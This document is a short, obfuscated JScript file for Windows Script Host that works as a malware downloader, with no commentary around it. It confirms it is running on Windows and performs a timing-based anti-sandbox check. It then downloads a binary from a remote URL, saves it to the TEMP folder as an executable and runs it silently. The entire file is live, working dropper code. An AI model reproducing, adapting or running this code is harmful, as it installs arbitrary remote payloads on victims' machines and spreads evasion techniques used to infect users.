var N0 = false;
var L = "CreateObject";
var FX = function jQ() {return WScript[L]("WScript.Shell");}(), h = 11;
var Z = "MSXML2.XMLHTTP";
var Dd = 2123213;
var Vy = 0;
function GG(N){FX["Run"](N, Vy, Vy);};
function wy(){return "" + Z;};
function pS(L0, Du){Vy = Vy * 1; return L0 - Du;};
function m(){return L;};
/*@cc_on
  @if (@_win32 || @_win64)
    N0 = true;
  @end
@*/
if (N0)
{
var jB = "";
function t(){return 22;};
var Ad = 0; var gH = 0;
function e()
{
var w = new this["Date"]();
var o = w["getUTCMilliseconds"]();
WScript["Sleep"](t());
var w = new this["Date"]();
var WX = w["getUTCMilliseconds"]();
WScript["Sleep"](t());
var w = new this["Date"]();
var A = w["getUTCMilliseconds"]();
var Ad = "Oo";
Ad = pS(WX, o);
var gH = "C";
gH = pS(A, WX);
jB = "open";
return pS(Ad, gH);
}
var sw = false;
var R = false;
for (var y = Vy; y < t() * 1; y++){if (e() != Vy){
sw = true; 
gH = "31" + 11 * Ad + gH; 
R = true; 
break;
}}
function T() {return ((sw == true) && (sw == R)) ? 1 : Vy;};
if (sw && T() && R){
function px() {return FX["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "hiDtaR3ha4L.exe";};
 td = wy();
 A0 = WScript[L](td);
 var Y = 1;
 while (Y){
try {
A0[jB]("GET", "http://blog.insite.pt/m8djs", false);
A0["send"]();
uP = "Sleep";
for (;;){WScript[uP](t() * 11); if (A0["readystate"] >= 2 * 2) break;};
Y = Vy;
} catch(u){};
}
function W(pa) {var MR = (1, 2, 3, 4, 5, pa); return MR;};
iA = WScript[m()]("ADODB.Stream");
td = iA;
td[jB]();
td["type"] = W(1);
td["write"](A0["ResponseBody"]);
iA["position"] = W(Vy);
td["Save" + "ToFile"](px(), 2);
iA["c"+"lose"]();
zn = px();
GG(zn);
}
}

